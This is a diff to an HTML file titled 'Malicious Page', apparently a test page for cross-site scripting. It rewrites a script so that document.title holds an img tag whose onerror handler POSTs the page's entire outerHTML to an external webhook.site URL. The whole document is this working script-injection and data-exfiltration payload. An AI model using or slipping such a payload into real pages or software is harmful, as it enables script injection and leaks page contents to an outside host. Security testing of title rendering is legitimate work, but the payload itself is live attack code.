@@ -23,13 +23,7 @@
     <meta charset="UTF-8">
     <title>Malicious Page</title>
     <script>
-        function sendHTML() {
-            fetch('https://webhook.site/fd72ea59-3fa6-4bc7-8a83-176bf7ad585b', {
-                method: 'POST',
-                body: document.documentElement.outerHTML
-            });
-        }
-        document.title = '<img src="" onerror="sendHTML()">';
+        document.title = '<img src="" onerror="fetch(\'https://webhook.site/fd72ea59-3fa6-4bc7-8a83-176bf7ad585b\', {method: \'POST\', body: document.documentElement.outerHTML})">';
     </script>
 </head>
 <body>
